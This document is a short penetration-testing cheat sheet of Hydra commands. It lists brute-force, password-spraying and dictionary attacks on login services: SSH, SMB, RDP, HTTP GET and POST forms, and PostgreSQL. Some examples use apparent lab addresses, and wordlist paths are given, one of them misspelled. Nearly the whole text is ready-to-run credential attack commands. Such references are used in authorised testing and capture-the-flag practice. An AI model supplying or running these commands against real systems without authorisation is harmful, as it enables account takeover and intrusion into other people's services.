##### **Hydra**
Brute Forcing with both Username and Password list, Change Service accordingly.
```
hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://target_IP
```
```
hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt -s SSH_Port ssh://target_IP
```

Brute forcing ssh with Password list
```
hydra -l USER_NAME -P /usr/share/wordlists/rockyou.txt ssh://target_IP
```
```
hydra -l USER_NAME -P /usr/share/wordlists/rockyou.txt -s SSH_Port ssh://target_IP
```

SMB brute force, Change service accordingly
```
hydra -L user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target_ip smb
```
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target_ip smb2
```

Password Spraying, Change service accordingly.
```
hydra -L users.txt -p "PASSWORD" rdp://Target_IP
```
```
hydra -L users.txt -p "PASSWORD" -s RDP_PORT rdp://Target_IP
```

Dictionary Attack on HTTP Login Post Form, Change the form contents accordingly.
```
hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:LOGIN FAILED INDICATOR"
```
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form '/department/login.php:username=^USER^&password=^PASS^:Invalid Password!'
```
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.'
```

HTTP_GET Attack in Hydra.
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://Target_ip
```

psql
```
hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt 172.16.242.134 postgres
```

Wordlists
```
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
```
/usr/share/wordilists/rockyou.txt
```